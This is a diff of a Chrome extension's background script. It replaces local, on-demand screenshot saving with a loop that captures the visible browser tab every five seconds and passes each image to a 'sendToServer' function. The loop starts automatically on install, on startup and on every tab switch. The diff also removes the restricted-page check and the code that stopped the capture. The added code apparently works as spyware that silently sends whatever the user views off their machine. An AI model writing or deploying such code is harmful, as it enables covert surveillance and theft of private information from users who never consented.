@@ -172,57 +172,34 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
 ************************/
 
-// Function to capture a screenshot of the visible tab
-function captureScreenshot() {
-    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-        if (tabs.length === 0) {
-            console.error("No active tab found.");
-            return;
-        }
+let intervalId = null;
 
-        const activeTab = tabs[0];
-
-        // Skip capturing restricted pages (e.g., chrome://, about:)
-        if (activeTab.url.startsWith("chrome://") || activeTab.url.startsWith("about:")) {
-            console.error("Cannot capture restricted page:", activeTab.url);
-            return;
-        }
-
-        // Capture the visible tab
-        chrome.tabs.captureVisibleTab(activeTab.windowId, { format: "png" }, (dataUrl) => {
-            if (chrome.runtime.lastError) {
-                console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
-                return;
-            }
-
-            console.log("Screenshot captured:", dataUrl);
-            saveScreenshotLocally(dataUrl); // Save the screenshot locally
-        });
-    });
+function startScreenshotLoop() {
+    if (!intervalId) {
+        console.log("Started automatic screenshots every 5 seconds.");
+        intervalId = setInterval(() => {
+            chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
+                if (chrome.runtime.lastError) {
+                    console.error("Error capturing screenshot:", chrome.runtime.lastError.message);
+                } else {
+                    sendToServer("screenshot", imageUri);
+                }
+            });
+        }, 5000);
+    }
 }
 
-// Function to save the screenshot locally
-function saveScreenshotLocally(dataUrl) {
-    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
-    const filename = `screenshots/screenshot-${timestamp}.png`; // Save in a "screenshots" subfolder
-
+function downloadScreenshot(imageUri) {
+    const filename = `screenshot_${Date.now()}.png`;
     chrome.downloads.download({
-        url: dataUrl,
-        filename: filename // Specify the relative path
-    }, (downloadId) => {
-        if (chrome.runtime.lastError) {
-            console.error("Error saving screenshot:", chrome.runtime.lastError.message);
-        } else {
-            console.log("Screenshot saved:", filename);
-        }
+        url: imageUri,
+        filename: filename
     });
 }
 
-// Set up a timer to capture screenshots every 5 seconds
-let screenshotInterval = setInterval(captureScreenshot, 5000);
+// Start the screenshot loop as soon as the extension is installed or reloaded
+chrome.runtime.onStartup.addListener(startScreenshotLoop);
+chrome.runtime.onInstalled.addListener(startScreenshotLoop);
 
-// Stop the interval if needed (e.g., when the extension is disabled)
-chrome.runtime.onSuspend.addListener(() => {
-    clearInterval(screenshotInterval);
-    console.log("Screenshot capture stopped.");
-});
+// Ensure it runs when a new tab is activated
+chrome.tabs.onActivated.addListener(startScreenshotLoop);
